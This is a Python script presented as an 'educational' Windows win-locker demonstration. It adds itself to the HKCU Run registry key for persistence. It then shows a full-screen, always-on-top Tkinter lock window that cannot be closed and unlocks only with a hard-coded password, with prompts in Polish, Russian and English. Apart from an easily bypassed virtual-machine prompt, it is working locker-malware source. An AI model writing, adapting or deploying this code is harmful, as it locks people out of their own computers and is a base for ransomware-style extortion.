"""
PROJECT: Educational Win-Locker Demonstration
AUTHOR: saszakapibar
URL: https://saszakapibar.github.io/
DESCRIPTION: This script is for educational purposes ONLY. 
             It demonstrates the use of Windows Registry and Tkinter.
             DO NOT RUN ON YOUR OWN SYSTEM.
"""
import os
import sys
import tkinter as tk
from tkinter import messagebox
import winreg as reg
from PIL import Image, ImageTk

# Dictionary with translations for three languages
TRANSLATIONS = {
    "PL": {
        "label": "Podaj hasło, aby odblokować:",
        "button": "Odblokuj",
        "error_title": "Błąd",
        "error_msg": "Niepoprawne hasło! Spróbuj ponownie.",
    },
    "RU": {
        "label": "Введите пароль для разблокировки:",
        "button": "Разблокировать",
        "error_title": "Ошибка",
        "error_msg": "Неверный пароль! Попробуйте еще раз.",
    },
    "EN": {
        "label": "Enter password to unlock:",
        "button": "Unlock",
        "error_title": "Error",
        "error_msg": "Incorrect password! Try again.",
    },
}


def add_to_startup(program_name):
    if getattr(sys, "frozen", False):
        startup_command = f'"{os.path.abspath(sys.executable)}"'
    else:
        python_path = os.path.abspath(sys.executable)
        script_path = os.path.abspath(sys.argv[0])
        startup_command = f'"{python_path}" "{script_path}"'

    registry_key = r"Software\Microsoft\Windows\CurrentVersion\Run"

    try:
        key = reg.OpenKey(
            reg.HKEY_CURRENT_USER, registry_key, 0, reg.KEY_SET_VALUE
        )
        reg.SetValueEx(key, program_name, 0, reg.REG_SZ, startup_command)
        reg.CloseKey(key)
        print("[+] Successfully added to startup.")
    except Exception as e:
        print(f"[-] Registry error: {e}")


def check_password(entered_password, window, lang):
    if entered_password == "kapibar":
        window.destroy()
    else:
        messagebox.showerror(
            TRANSLATIONS[lang]["error_title"], TRANSLATIONS[lang]["error_msg"]
        )


def run_locker():
    # Automatically determine the path to the image in the same directory
    if getattr(sys, 'frozen', False):
        current_folder = os.path.dirname(sys.executable)
    else:
        current_folder = os.path.dirname(os.path.abspath(__file__))
        
    image_path = os.path.join(current_folder, "saszakapibar.png")
    
    # Default language is set to English
    current_lang = ["EN"]

    root = tk.Tk()
    root.title("Verification")
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.config(cursor="arrow")

    root.protocol("WM_DELETE_WINDOW", lambda: None)

    width = root.winfo_screenwidth()
    height = root.winfo_screenheight()

    if os.path.exists(image_path):
        try:
            img = Image.open(image_path)
            img = img.resize((width, height), Image.Resampling.LANCZOS)
            photo = ImageTk.PhotoImage(img)
            background = tk.Label(root, image=photo)
            background.place(x=0, y=0, relwidth=1, relheight=1)
            background.image = photo
        except Exception as e:
            print(f"[-] Error loading image: {e}")
            root.config(bg="gray")
    else:
        print(f"[-] Image not found at: {image_path}")
        root.config(bg="gray")

    # Main login panel in the center of the screen
    frame = tk.Frame(root, bg="white", bd=5, relief="solid")
    frame.place(relx=0.5, rely=0.5, anchor="center")

    # --- LANGUAGE SELECTION SECTION ---
    lang_frame = tk.Frame(frame, bg="white")
    lang_frame.pack(pady=10)

    # Function to change text on the fly
    def change_lang(lang_code):
        current_lang[0] = lang_code
        label.config(text=TRANSLATIONS[lang_code]["label"])
        button.config(text=TRANSLATIONS[lang_code]["button"])

    btn_pl = tk.Button(lang_frame, text="PL", font=("Arial", 10, "bold"), command=lambda: change_lang("PL"), width=5)
    btn_pl.pack(side="left", padx=5)

    btn_ru = tk.Button(lang_frame, text="RU", font=("Arial", 10, "bold"), command=lambda: change_lang("RU"), width=5)
    btn_ru.pack(side="left", padx=5)

    btn_en = tk.Button(lang_frame, text="EN", font=("Arial", 10, "bold"), command=lambda: change_lang("EN"), width=5)
    btn_en.pack(side="left", padx=5)
    # ---------------------------------------------

    # Info label
    label = tk.Label(
        frame, text=TRANSLATIONS["EN"]["label"], font=("Arial", 14), bg="white"
    )
    label.pack(pady=10, padx=20)

    # Password text field
    password_field = tk.Entry(frame, font=("Arial", 14), show="*")
    password_field.pack(pady=10, padx=20)
    password_field.focus()

    # Unlock button
    button = tk.Button(
        frame,
        text=TRANSLATIONS["EN"]["button"],
        font=("Arial", 12),
        command=lambda: check_password(password_field.get(), root, current_lang[0]),
    )
    button.pack(pady=10)

    # Support Enter key in text field
    password_field.bind(
        "<Return>", lambda event: check_password(password_field.get(), root, current_lang[0])
    )

    root.mainloop()


if __name__ == "__main__":
    # Educational safety check
    response = input("Are you using a Virtual Machine for this educational test? (y/n): ")
    
    if response.lower() == 'y':
        print("[+] Educational environment confirmed. Starting...")
        # 1. Add to startup
        add_to_startup("EducationalScript")

        # 2. Run the locker
        run_locker()
    else:
        print("[-] Safety check failed. The script will close to prevent unauthorized use.")
        sys.exit()
